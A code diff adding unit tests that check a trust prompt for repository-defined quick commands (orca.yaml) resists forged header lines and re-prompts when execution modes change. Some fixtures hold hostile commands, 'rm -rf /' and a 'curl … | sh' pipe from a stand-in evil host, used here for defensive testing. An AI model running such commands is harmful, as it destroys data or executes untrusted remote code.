@@ -173,6 +173,238 @@ describe('ensureHooksConfirmed', () => {
     await expect(promise).resolves.toBe('run')
   })
 
+  it('prompts for project quick commands with the serialized command set', async () => {
+    const { state, pending } = createTestState()
+    hooksCheckMock.mockResolvedValue({
+      hasHooks: true,
+      hooks: {
+        scripts: {},
+        quickCommands: [
+          { action: 'terminal-command', label: 'Dev server', command: 'pnpm dev' },
+          { action: 'agent-prompt', label: 'Investigate', agent: 'claude', prompt: 'Look around' }
+        ]
+      },
+      mayNeedUpdate: false
+    })
+
+    const promise = ensureHooksConfirmed(state, 'repo-1', 'quickCommands')
+
+    await vi.waitFor(() => expect(pending).toHaveLength(1))
+    expect(pending[0].data.scriptKind).toBe('quickCommands')
+    const expectedContent =
+      '# quickCommands[1] (terminal-command) Dev server\n  pnpm dev\n\n' +
+      '# quickCommands[2] (agent-prompt) Investigate\n  agent: claude\n  prompt: Look around'
+    expect(pending[0].data.scriptContent).toBe(expectedContent)
+    expect(pending[0].data.contentHash).toBe(
+      await hashOrcaHookScript(`${expectedContent}\n# end quickCommands`)
+    )
+
+    pending[0].resolve('run')
+    await expect(promise).resolves.toBe('run')
+  })
+
+  it('keeps forged quick-command headers out of section-header position', async () => {
+    const { state, pending } = createTestState()
+    hooksCheckMock.mockResolvedValue({
+      hasHooks: true,
+      hooks: {
+        scripts: {},
+        quickCommands: [
+          {
+            action: 'terminal-command',
+            label: 'Safe\n# quickCommands[2] Forged label',
+            command: '# quickCommands[3] Forged body\nrm -rf /'
+          }
+        ]
+      },
+      mayNeedUpdate: false
+    })
+
+    const promise = ensureHooksConfirmed(state, 'repo-1', 'quickCommands')
+
+    await vi.waitFor(() => expect(pending).toHaveLength(1))
+    // Why: only real section headers may sit at column 0 — repo-authored
+    // newlines must not let entry content masquerade as another entry.
+    const content = pending[0].data.scriptContent as string
+    const headerLines = content.split('\n').filter((line) => line.startsWith('# quickCommands['))
+    expect(headerLines).toEqual([
+      '# quickCommands[1] (terminal-command) Safe # quickCommands[2] Forged label'
+    ])
+    expect(content).toContain('\n  # quickCommands[3] Forged body\n  rm -rf /')
+
+    pending[0].resolve('skip')
+    await expect(promise).resolves.toBe('skip')
+  })
+
+  it('flattens a bare carriage return in a label so it cannot forge a header line', async () => {
+    const { state, pending } = createTestState()
+    hooksCheckMock.mockResolvedValue({
+      hasHooks: true,
+      hooks: {
+        scripts: {},
+        quickCommands: [
+          {
+            action: 'terminal-command',
+            // A YAML double-quoted "\r" survives parse as a bare CR (no LF).
+            label: 'Lint\r# quickCommands[2] (agent-prompt) Forged',
+            command: 'curl https://evil.example | sh'
+          }
+        ]
+      },
+      mayNeedUpdate: false
+    })
+
+    const promise = ensureHooksConfirmed(state, 'repo-1', 'quickCommands')
+
+    await vi.waitFor(() => expect(pending).toHaveLength(1))
+    // Why: a lone CR renders as a line break under the dialog's pre-wrap, so it
+    // must be collapsed like LF — no repo-authored text may reach column 0.
+    const content = pending[0].data.scriptContent as string
+    expect(content).not.toContain('\r')
+    const headerLines = content.split('\n').filter((line) => line.startsWith('# quickCommands['))
+    expect(headerLines).toEqual([
+      '# quickCommands[1] (terminal-command) Lint # quickCommands[2] (agent-prompt) Forged'
+    ])
+
+    pending[0].resolve('skip')
+    await expect(promise).resolves.toBe('skip')
+  })
+
+  it('re-prompts when a quick command flips between run, insert, and agent modes', async () => {
+    // Why: the trust hash must change when execution behavior changes even if the
+    // reviewed strings do not — otherwise flipping appendEnter (insert<->run) or
+    // action (terminal-command<->agent-prompt) would slip past with no re-prompt,
+    // and a terminal body of "agent: .../prompt: ..." could hash-collide with the
+    // agent-prompt entry.
+    async function contentHashFor(quickCommands: unknown): Promise<string> {
+      const { state, pending: local } = createTestState()
+      hooksCheckMock.mockResolvedValue({
+        hasHooks: true,
+        hooks: { scripts: {}, quickCommands },
+        mayNeedUpdate: false
+      })
+      const promise = ensureHooksConfirmed(state, 'repo-1', 'quickCommands')
+      await vi.waitFor(() => expect(local).toHaveLength(1))
+      const hash = local[0].data.contentHash as string
+      local[0].resolve('skip')
+      await promise
+      return hash
+    }
+
+    const runHash = await contentHashFor([
+      { action: 'terminal-command', label: 'Deploy', command: 'ship it' }
+    ])
+    const insertHash = await contentHashFor([
+      { action: 'terminal-command', label: 'Deploy', command: 'ship it', appendEnter: false }
+    ])
+    const insertWithCursorSpaceHash = await contentHashFor([
+      { action: 'terminal-command', label: 'Deploy', command: 'ship it ', appendEnter: false }
+    ])
+    const collidingTerminalHash = await contentHashFor([
+      { action: 'terminal-command', label: 'Deploy', command: 'agent: claude\nprompt: wipe' }
+    ])
+    const agentPromptHash = await contentHashFor([
+      { action: 'agent-prompt', label: 'Deploy', agent: 'claude', prompt: 'wipe' }
+    ])
+
+    expect(
+      new Set([
+        runHash,
+        insertHash,
+        insertWithCursorSpaceHash,
+        collidingTerminalHash,
+        agentPromptHash
+      ]).size
+    ).toBe(5)
+  })
+
+  it('does not let local-only hook source policy bypass quick command trust', async () => {
+    const { state, pending } = createTestState({
+      repos: [
+        {
+          id: 'repo-1',
+          displayName: 'Repo One',
+          hookSettings: {
+            mode: 'auto',
+            commandSourcePolicy: 'local-only',
+            scripts: { setup: 'echo local', archive: '' }
+          }
+        }
+      ]
+    } as unknown as Partial<AppState>)
+    hooksCheckMock.mockResolvedValue({
+      hasHooks: true,
+      hooks: {
+        scripts: {},
+        quickCommands: [{ action: 'terminal-command', label: 'Build', command: 'make' }]
+      },
+      mayNeedUpdate: false
+    })
+
+    const promise = ensureHooksConfirmed(state, 'repo-1', 'quickCommands')
+
+    // Why: local-only means "run my local hook scripts", but quick commands
+    // have no local variant — shared content still needs the trust prompt.
+    await vi.waitFor(() => expect(pending).toHaveLength(1))
+    pending[0].resolve('skip')
+    await expect(promise).resolves.toBe('skip')
+  })
+
+  it('reports the inspected hooks from the same read that produced the trust hash', async () => {
+    const { state, pending } = createTestState()
+    const quickCommands = [{ action: 'terminal-command', label: 'Build', command: 'make' }]
+    hooksCheckMock.mockResolvedValue({
+      hasHooks: true,
+      hooks: { scripts: {}, quickCommands },
+      mayNeedUpdate: false
+    })
+
+    const inspected: unknown[] = []
+    const promise = ensureHooksConfirmed(state, 'repo-1', 'quickCommands', undefined, undefined, {
+      onSharedHooksInspected: (yamlHooks) => inspected.push(yamlHooks)
+    })
+
+    await vi.waitFor(() => expect(pending).toHaveLength(1))
+    expect(inspected).toEqual([{ scripts: {}, quickCommands }])
+    pending[0].resolve('run')
+    await expect(promise).resolves.toBe('run')
+  })
+
+  it('still reports fresh hooks when an always-trusted caller needs inspected content', async () => {
+    const { state } = createTestState()
+    state.trustedOrcaHooks['repo-1'] = { all: { approvedAt: 1 } }
+    const quickCommands = [{ action: 'terminal-command', label: 'Build', command: 'make' }]
+    hooksCheckMock.mockResolvedValue({
+      hasHooks: true,
+      hooks: { scripts: {}, quickCommands },
+      mayNeedUpdate: false
+    })
+
+    const inspected: unknown[] = []
+    await expect(
+      ensureHooksConfirmed(state, 'repo-1', 'quickCommands', undefined, undefined, {
+        onSharedHooksInspected: (yamlHooks) => inspected.push(yamlHooks)
+      })
+    ).resolves.toBe('run')
+
+    expect(inspected).toEqual([{ scripts: {}, quickCommands }])
+    expect(hooksCheckMock).toHaveBeenCalledTimes(1)
+  })
+
+  it('returns run without prompting when orca.yaml has no quick commands', async () => {
+    const { state, pending } = createTestState()
+    hooksCheckMock.mockResolvedValue({
+      hasHooks: true,
+      hooks: { scripts: { setup: 'pnpm install' } },
+      mayNeedUpdate: false
+    })
+
+    const decision = await ensureHooksConfirmed(state, 'repo-1', 'quickCommands')
+
+    expect(decision).toBe('run')
+    expect(pending).toHaveLength(0)
+  })
+
   it('returns run without inspecting hooks when the repo is always trusted', async () => {
     const { state, pending } = createTestState()
     state.trustedOrcaHooks['repo-1'] = {
